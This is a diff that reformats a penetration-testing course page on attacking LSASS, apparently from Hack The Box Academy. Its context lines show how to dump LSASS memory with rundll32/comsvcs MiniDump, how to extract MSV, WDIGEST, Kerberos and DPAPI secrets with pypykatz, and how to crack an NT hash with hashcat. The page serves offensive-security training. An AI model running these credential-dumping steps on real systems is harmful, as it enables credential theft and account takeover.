@@ -8,12 +8,12 @@
 // Section ID: 1359
 // Section Title: Attacking LSASS
 // Page Title: Password Attacks
-// Page Number: 8
+// Page Number: 08
 -->
 
 # Attacking LSASS
 
-**Module Name:** Password Attacks **Page Number:** 8
+**Module Name:** Password Attacks **Page Number:** 08
 
 #### PASSWORD ATTACKS
 
@@ -27,7 +27,7 @@
 
 ![https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png](https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png)
 
-```cmd-session
+``` cmd-session
 C:\Users\loggedonusersdirectory\AppData\Local\Temp
 ```
 
@@ -35,7 +35,7 @@ C:\Users\loggedonusersdirectory\AppData\Local\Temp
 
 #### Finding LSASS PID in cmd
 
-```cmd-session
+``` cmd-session
 C:\Windows\system32> tasklist /svc
 
 Image Name                     PID Services
@@ -58,7 +58,7 @@ fontdrvhost.exe                812 N/A
 
 #### Finding LSASS PID in PowerShell
 
-```powershell-session
+``` powershell-session
 PS C:\Windows\system32> Get-Process lsass
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
@@ -68,7 +68,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 
 #### Creating lsass.dmp using PowerShell
 
-```powershell-session
+``` powershell-session
 PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
 
@@ -76,7 +76,7 @@ PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C
 
 #### Running Pypykatz
 
-```shell-session
+``` shell-session
 [!bash!]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
 
 INFO:root:Parsing file /home/peter/Documents/lsass.dmp
@@ -169,7 +169,7 @@ luid 1343859
 
 #### MSV
 
-```shell-session
+``` shell-session
 sid S-1-5-21-4019466498-1700476312-3544718034-1001
 luid 1354633
 	== MSV ==
@@ -183,7 +183,7 @@ luid 1354633
 
 #### WDIGEST
 
-```shell-session
+``` shell-session
 == WDIGEST [14ab89]==
 		username bob
 		domainname DESKTOP-33E7O54
@@ -193,7 +193,7 @@ luid 1354633
 
 #### Kerberos
 
-```shell-session
+``` shell-session
 == Kerberos ==
 		Username: bob
 		Domain: DESKTOP-33E7O54
@@ -201,7 +201,7 @@ luid 1354633
 
 #### DPAPI
 
-```shell-session
+``` shell-session
 == DPAPI [14ab89]==
 		luid 1354633
 		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
@@ -211,7 +211,7 @@ luid 1354633
 
 #### Cracking the NT Hash with Hashcat
 
-```shell-session
+``` shell-session
 [!bash!]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
 64f12cddaa88057e06a81b54e73b949b:Password1
